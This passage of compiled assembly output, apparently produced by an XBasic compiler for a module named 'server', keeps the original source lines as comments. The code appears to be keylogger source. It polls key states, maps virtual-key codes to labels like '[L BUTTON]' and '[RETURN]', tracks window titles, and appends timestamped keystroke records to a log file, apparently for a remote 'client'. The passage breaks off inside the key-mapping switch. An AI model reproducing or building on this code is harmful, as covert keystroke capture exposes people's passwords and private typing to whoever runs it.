	push	15000			;;; i656a
	push	[%#hsmEventLog.server]			;;; i672a
	call	_WaitForSingleObject@8			;;; i619
	cmp	eax,258			;;; i684a
	jne	>> else.0055.server			;;; i219
;
; [1034] RETURN -1
	mov	eax,1			;;; i659
	neg	eax			;;; i916
	jmp	end.func5B.server			;;; i258
;
; [1035] END IF
else.0055.server:
end.if.0055.server:
;
; [1037] elsize = SIZE(eventlog)
#ifdef GetEventLogSize.elsize
#undef GetEventLogSize.elsize
#endif
#define GetEventLogSize.elsize ebp-40	; exposes local variable 'elsize'
;
	mov	eax,d[%eventlog.server]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.124			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.124:
	mov	d[ebp-40],eax			;;; i670
;
; [1038] ReleaseSemaphore (#hsmEventLog,1,NULL)
#ifdef GetEventLogSize.NULL
#undef GetEventLogSize.NULL
#endif
#define GetEventLogSize.NULL ebp-44	; exposes local variable 'NULL'
;
	push	[ebp-44]			;;; i674a
	push	1			;;; i656a
	push	[%#hsmEventLog.server]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [1040] RETURN elsize
	mov	eax,d[ebp-40]			;;; i665
	jmp	end.func5B.server			;;; i258
;
; [1041] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetEventLogSize.server:  ;;; Function end label for Assembly Programmers.
end.func5B.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  GetEventLogSize ()  *****
;  *****
;
; [1043] FUNCTION STRING GetEventLog()
.code
align 16
_GetEventLog.server@0:
;  *****
;  *****  FUNCTION  GetEventLog ()  *****
;  *****
func5A.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func5A.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
funcBody5A.server:
;
; [1044] SHARED STRING eventlog
;
; [1045] STRING tmpelog
#ifdef GetEventLog.tmpelog
#undef GetEventLog.tmpelog
#endif
#define GetEventLog.tmpelog ebp-40	; exposes local variable 'tmpelog'
;
;
; [1047] IF WaitForSingleObject (#hsmEventLog,15000) == $$WAIT_TIMEOUT THEN
	push	15000			;;; i656a
	push	[%#hsmEventLog.server]			;;; i672a
	call	_WaitForSingleObject@8			;;; i619
	cmp	eax,258			;;; i684a
	jne	>> else.0056.server			;;; i219
;
; [1048] RETURN ""
	xor	eax,eax			;;; i658
	call	%_clone.a0			;;; i870
	jmp	end.func5A.server			;;; i258
;
; [1049] END IF
else.0056.server:
end.if.0056.server:
;
; [1051] tmpelog = eventlog
	mov	eax,[%eventlog.server]			;;; i663a
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1052] ReleaseSemaphore (#hsmEventLog,1,NULL)
#ifdef GetEventLog.NULL
#undef GetEventLog.NULL
#endif
#define GetEventLog.NULL ebp-44	; exposes local variable 'NULL'
;
	push	[ebp-44]			;;; i674a
	push	1			;;; i656a
	push	[%#hsmEventLog.server]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [1054] RETURN tmpelog
	mov	eax,[ebp-40]			;;; i665
	call	%_clone.a0			;;; i870
	jmp	end.func5A.server			;;; i258
;
; [1055] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetEventLog.server:  ;;; Function end label for Assembly Programmers.
end.func5A.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func5A.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func5A.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  GetEventLog ()  *****
;  *****
;
; [1057] FUNCTION EventSaveLogExA ()
.code
align 16
_EventSaveLogExA.server@0:
;  *****
;  *****  FUNCTION  EventSaveLogExA ()  *****
;  *****
func54.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func54.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,200			;;; i114a
;
funcBody54.server:
;
; [1058] SHARED STRING neweventslog
;
; [1059] SHARED APPLSTATUS
;
; [1060] SHARED RECORDEVENTS
;
; [1061] STRING tmplog
#ifdef EventSaveLogExA.tmplog
#undef EventSaveLogExA.tmplog
#endif
#define EventSaveLogExA.tmplog ebp-40	; exposes local variable 'tmplog'
;
;
; [1064] DO
align 8
do.0057.server:
;
; [1065] Sleep (1000)
	push	1000			;;; i656a
	call	_Sleep@4			;;; i619
;
; [1067] IF WaitForSingleObject(#mtSaveLogEx,15000) == $$WAIT_TIMEOUT THEN
	push	15000			;;; i656a
	push	[%#mtSaveLogEx.server]			;;; i672a
	call	_WaitForSingleObject@8			;;; i619
	cmp	eax,258			;;; i684a
	jne	>> else.0058.server			;;; i219
;
; [1068] '	PRINT "EventSaveLogExA:mtSaveLogEx timeout"
;
; [1069] EXIT IF
	jmp	end.if.0058.server			;;; i146
;
; [1070] ELSE
	jmp	end.if.0058.server			;;; i107
else.0058.server:
;
; [1071] IF LEN(neweventslog) > 0 THEN
	mov	eax,d[%neweventslog.server]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.131			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.131:
	cmp	eax,0			;;; i684a
	jle	>> else.0059.server			;;; i219
;
; [1072] tmplog = neweventslog
	mov	eax,[%neweventslog.server]			;;; i663a
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1073] neweventslog = ""
	xor	eax,eax			;;; i3
	mov	ebx,addr %neweventslog.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1074] ReleaseMutex (#mtSaveLogEx)
	push	[%#mtSaveLogEx.server]			;;; i672a
	call	_ReleaseMutex@4			;;; i619
;
; [1075] EventSaveLog (tmplog)
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	call	func55.server			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
;
; [1076] tmplog = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1077] ELSE
	jmp	end.if.0059.server			;;; i107
else.0059.server:
;
; [1078] ReleaseMutex (#mtSaveLogEx)
	push	[%#mtSaveLogEx.server]			;;; i672a
	call	_ReleaseMutex@4			;;; i619
;
; [1079] END IF
end.if.0059.server:
;
; [1080] END IF
end.if.0058.server:
;
; [1081] LOOP WHILE ((APPLSTATUS == $$TRUE) && (RECORDEVENTS == $$TRUE))
do.loop.0057.server:
	mov	eax,d[%APPLSTATUS.server]			;;; i663a
	cmp	eax,-1			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jne	> A.132			;;; i467
	not	eax			;;; i468
A.132:
;+peep
	mov	ebx,d[%RECORDEVENTS.server]			;;; i663a
	cmp	ebx,-1			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.133			;;; i467
	not	ebx			;;; i468
A.133:
;+peep
	neg	eax			;;; i745
	rcr	eax,1			;;; i746
	sar	eax,31			;;; i747
	mov	edx,ebx			;;; i748
	neg	edx			;;; i749
	rcr	edx,1			;;; i750
	sar	edx,31			;;; i751
	and	eax,edx			;;; i752
	test	eax,eax			;;; i194
	jnz	< do.0057.server			;;; i195
end.do.0057.server:
;
; [1083] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func54.server			;;; i258
;
; [1084] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.EventSaveLogExA.server:  ;;; Function end label for Assembly Programmers.
end.func54.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func54.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func54.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  EventSaveLogExA ()  *****
;  *****
;
; [1086] FUNCTION EventSaveLog (STRING log)
.code
;
#ifdef EventSaveLog.log
#undef EventSaveLog.log
#endif
#define EventSaveLog.log ebp+8	; exposes function argument 'log'
;
align 16
_EventSaveLog.server@4:
;  *****
;  *****  FUNCTION  EventSaveLog ()  *****
;  *****
func55.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.143:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.143			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,184			;;; i114a
;
funcBody55.server:
;
; [1087] STATIC STRING logheader
data section 'globals$statics'
align	4
%55%logheader.server:	db 4 dup ?
.code
;
; [1088] SHARED of
data section 'globals$shared'
align	4
%of.server:	db 4 dup ?
.code
;
; [1090] IFZ log THEN RETURN $$FALSE
	mov	eax,[ebp+8]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.137			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.005A.server			;;; i192
A.137:
	mov	eax,0			;;; i659
	jmp	end.func55.server			;;; i258
else.005A.server:
end.if.005A.server:
;
; [1092] FOR c = 0 TO (SIZE(log)-1)
#ifdef EventSaveLog.c
#undef EventSaveLog.c
#endif
#define EventSaveLog.c ebp-40	; exposes local variable 'c'
;
	mov	eax,0			;;; i659
	mov	d[ebp-40],eax			;;; i670
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.138			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.138:
	sub	eax,1			;;; i791
; .forlimit55.005B = ebp-44	; internal variable
	mov	d[ebp-44],eax			;;; i670
align 8
for.005B.server:
	mov	eax,d[ebp-40]			;;; i665
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.005B.server			;;; i154
;
; [1093] IF (log{c} == 1) THEN
	mov	eax,d[ebp-40]			;;; i665
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	cmp	eax,1			;;; i684a
	jne	>> else.005C.server			;;; i219
;
; [1094] log{c} = 13
	mov	eax,13			;;; i659
	mov	ebx,d[ebp-40]			;;; i665
	mov	ecx,d[ebp+8]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i29
;
; [1095] ELSE
	jmp	end.if.005C.server			;;; i107
else.005C.server:
;
; [1096] IF (log{c} == 2) THEN log{c} = 10
	mov	eax,d[ebp-40]			;;; i665
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	cmp	eax,2			;;; i684a
	jne	>> else.005D.server			;;; i219
	mov	eax,10			;;; i659
	mov	ebx,d[ebp-40]			;;; i665
	mov	ecx,d[ebp+8]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i29
else.005D.server:
end.if.005D.server:
;
; [1097] END IF
end.if.005C.server:
;
; [1098] NEXT c
do.next.005B.server:
	inc	d[ebp-40]			;;; i229
	jmp	for.005B.server			;;; i231
end.for.005B.server:
;
; [1100] IFZ logheader THEN
	mov	eax,[%55%logheader.server]			;;; i663a
	test	eax,eax			;;; i188
	jz	> A.140			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.005E.server			;;; i192
A.140:
;
; [1101] logheader = "\r\n\r\n##### "+GetDate()+" -- "+GetTime()+" #####\r\n"
	call	func17.server			;;; i619
	mov	ebx,addr @_string.0207.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0208.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
; .xstk55.0000 = ebp-52	; internal variable
	mov	[ebp-52],eax			;;; i670
	call	func16.server			;;; i619
	mov	ebx,[ebp-52]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0209.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr %55%logheader.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1102] log = logheader + log
	mov	eax,[%55%logheader.server]			;;; i663a
	mov	ebx,[ebp+8]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp+8]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1103] END IF
else.005E.server:
end.if.005E.server:
;
; [1105] IFZ of THEN of = OpenEventLog()
	mov	eax,d[%of.server]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.005F.server			;;; i195
	call	func58.server			;;; i619
	mov	d[%of.server],eax			;;; i668
else.005F.server:
end.if.005F.server:
;
; [1106] IF of < 0 THEN
	mov	eax,d[%of.server]			;;; i663a
	cmp	eax,0			;;; i684a
	jge	>> else.0060.server			;;; i219
;
; [1107] 'PRINT "unable to open event log: ",of
;
; [1108] of = 0
	mov	eax,0			;;; i659
	mov	d[%of.server],eax			;;; i668
;
; [1109] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func55.server			;;; i258
;
; [1110] END IF
else.0060.server:
end.if.0060.server:
;
; [1112] SEEK (of,LOF(of))
	sub	esp,64			;;; i487
	mov	eax,d[%of.server]			;;; i663a
	mov	d[esp],eax			;;; i887
	sub	esp,64			;;; i487
	mov	eax,d[%of.server]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_lof
	add	esp,64			;;; i600
	mov	d[esp+4],eax			;;; i887
	call	%_seek
	add	esp,64			;;; i600
;
; [1113] WRITE [of],log
	mov	eax,d[%of.server]			;;; i663a
; .filenumber = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
	sub	esp,64			;;; i271
	mov	eax,d[ebp-56]			;;; i665
	mov	d[esp],eax			;;; i272
	mov	eax,d[ebp+8]			;;; i665
	mov	d[esp+4],eax			;;; i273
	call	%_WriteString			;;; i274
	add	esp,64			;;; i275
;
; [1114] 'CLOSE (of)
;
; [1116] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func55.server			;;; i258
;
; [1117] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.EventSaveLog.server:  ;;; Function end label for Assembly Programmers.
end.func55.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  EventSaveLog ()  *****
;  *****
;
; [1119] FUNCTION GetKeyStatus (vkey)
.code
;
#ifdef GetKeyStatus.vkey
#undef GetKeyStatus.vkey
#endif
#define GetKeyStatus.vkey ebp+8	; exposes function argument 'vkey'
;
align 16
_GetKeyStatus.server@4:
;  *****
;  *****  FUNCTION  GetKeyStatus ()  *****
;  *****
func5C.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody5C.server:
;
; [1121] '	IF ((vkey < 0) || (vkey > 255)) THEN RETURN -1
;
; [1122] IF (vkey == $$VK_CAPITAL) || (vkey == $$VK_SCROLL) || (vkey == $$VK_NUMLOCK) THEN
	mov	eax,d[ebp+8]			;;; i665
	cmp	eax,20			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jne	> A.144			;;; i467
	not	eax			;;; i468
A.144:
;+peep
	mov	ebx,d[ebp+8]			;;; i665
	cmp	ebx,145			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.145			;;; i467
	not	ebx			;;; i468
A.145:
;+peep
	or	eax,ebx			;;; i732
	neg	eax			;;; i736
	rcr	eax,1			;;; i737
	sar	eax,31			;;; i738
	mov	ebx,d[ebp+8]			;;; i665
	cmp	ebx,144			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.146			;;; i467
	not	ebx			;;; i468
A.146:
;+peep
	or	eax,ebx			;;; i732
	neg	eax			;;; i736
	rcr	eax,1			;;; i737
	sar	eax,31			;;; i738
	test	eax,eax			;;; i220
	jz	>> else.0061.server			;;; i221
;
; [1123] RETURN GetKeyState(vkey){1,0}
;
; [0] EXTERNAL FUNCTION GetKeyState (nVirtKey)
	push	[ebp+8]			;;; i674a
	call	_GetKeyState@4			;;; i619
	push	eax			;;; i469
	mov	eax,1			;;; i659
	mov	ebx,0			;;; i659
	pop	esi			;;; i470
	mov	ecx,ebx			;;; i479
	shr	esi,cl			;;; i480
	mov	edi,-1			;;; i481
	mov	ecx,eax			;;; i482
	shl	edi,cl			;;; i483
	not	edi			;;; i484
	and	esi,edi			;;; i485
	mov	eax,esi			;;; i486
	jmp	end.func5C.server			;;; i258
;
; [1124] ELSE
	jmp	end.if.0061.server			;;; i107
else.0061.server:
;
; [1125] RETURN GetKeyState(vkey){1,7}
	push	[ebp+8]			;;; i674a
	call	_GetKeyState@4			;;; i619
	push	eax			;;; i469
	mov	eax,1			;;; i659
	mov	ebx,7			;;; i659
	pop	esi			;;; i470
	mov	ecx,ebx			;;; i479
	shr	esi,cl			;;; i480
	mov	edi,-1			;;; i481
	mov	ecx,eax			;;; i482
	shl	edi,cl			;;; i483
	not	edi			;;; i484
	and	esi,edi			;;; i485
	mov	eax,esi			;;; i486
	jmp	end.func5C.server			;;; i258
;
; [1126] END IF
end.if.0061.server:
;
; [1127] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetKeyStatus.server:  ;;; Function end label for Assembly Programmers.
end.func5C.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  GetKeyStatus ()  *****
;  *****
;
; [1129] FUNCTION EventProcess (vkey,state)
.code
;
#ifdef EventProcess.vkey
#undef EventProcess.vkey
#endif
#define EventProcess.vkey ebp+8	; exposes function argument 'vkey'
;
;
#ifdef EventProcess.state
#undef EventProcess.state
#endif
#define EventProcess.state ebp+12	; exposes function argument 'state'
;
align 16
_EventProcess.server@8:
;  *****
;  *****  FUNCTION  EventProcess ()  *****
;  *****
func57.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func57.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.155:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.155			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,176			;;; i114a
;
funcBody57.server:
;
; [1130] SHARED STRING atitle
data section 'globals$shared'
align	4
%atitle.server:	db 4 dup ?
.code
;
; [1131] STATIC STRING key
data section 'globals$statics'
align	4
%57%key.server:	db 4 dup ?
.code
;
; [1132] STRING title
#ifdef EventProcess.title
#undef EventProcess.title
#endif
#define EventProcess.title ebp-40	; exposes local variable 'title'
;
;
; [1133] SHARED client
;
; [1136] key = ""
	xor	eax,eax			;;; i3
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1137] SELECT CASE vkey
	mov	eax,d[ebp+8]			;;; i665
; .select57.0062 = ebp-44	; internal variable
	mov	d[ebp-44],eax			;;; i670
;
; [1138] CASE $$VK_LBUTTON		:key = "[L BUTTON]"
	mov	eax,1			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0001.server			;;; i71
	mov	eax,addr @_string.0216.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1139] CASE $$VK_RBUTTON		:key = "[R BUTTON]"
	jmp	end.select.0062.server			;;; i69
case.0062.0001.server:
	mov	eax,2			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0002.server			;;; i71
	mov	eax,addr @_string.0218.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1140] CASE $$VK_CANCEL 		:key = "[CANCEL]"
	jmp	end.select.0062.server			;;; i69
case.0062.0002.server:
	mov	eax,3			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0003.server			;;; i71
	mov	eax,addr @_string.021A.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1141] CASE $$VK_MBUTTON		:key = "[M BUTTON]"
	jmp	end.select.0062.server			;;; i69
case.0062.0003.server:
	mov	eax,4			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0004.server			;;; i71
	mov	eax,addr @_string.021C.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1142] CASE $$VK_BACK			:key = "[BACK]"
	jmp	end.select.0062.server			;;; i69
case.0062.0004.server:
	mov	eax,8			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0005.server			;;; i71
	mov	eax,addr @_string.021E.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1143] CASE $$VK_TAB			:key = "[TAB]"
	jmp	end.select.0062.server			;;; i69
case.0062.0005.server:
	mov	eax,9			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0006.server			;;; i71
	mov	eax,addr @_string.0220.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1144] CASE $$VK_CLEAR			:key = "[CLEAR]"
	jmp	end.select.0062.server			;;; i69
case.0062.0006.server:
	mov	eax,12			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0007.server			;;; i71
	mov	eax,addr @_string.0222.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1145] CASE $$VK_RETURN		:key = "[RETURN]\1\2"
	jmp	end.select.0062.server			;;; i69
case.0062.0007.server:
	mov	eax,13			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0008.server			;;; i71
	mov	eax,addr @_string.0224.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1146] CASE $$VK_KANA			:key = "[KANA]"
	jmp	end.select.0062.server			;;; i69
case.0062.0008.server:
	mov	eax,15			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0009.server			;;; i71
	mov	eax,addr @_string.0225.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1147] CASE $$VK_SHIFT			:key = ""'"[SHIFT]"
	jmp	end.select.0062.server			;;; i69
case.0062.0009.server:
	mov	eax,16			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.000A.server			;;; i71
	xor	eax,eax			;;; i3
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1148] CASE $$VK_CONTROL		:key = ""'"[CONTROL]"
	jmp	end.select.0062.server			;;; i69
case.0062.000A.server:
	mov	eax,17			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.000B.server			;;; i71
	xor	eax,eax			;;; i3
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1149] CASE $$VK_MENU			:key = ""'"[ALT]"
	jmp	end.select.0062.server			;;; i69
case.0062.000B.server:
	mov	eax,18			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.000C.server			;;; i71
	xor	eax,eax			;;; i3
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1150] CASE $$VK_PAUSE			:key = "[PAUSE]"
	jmp	end.select.0062.server			;;; i69
case.0062.000C.server:
	mov	eax,19			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.000D.server			;;; i71
	mov	eax,addr @_string.022A.server			;;; i663
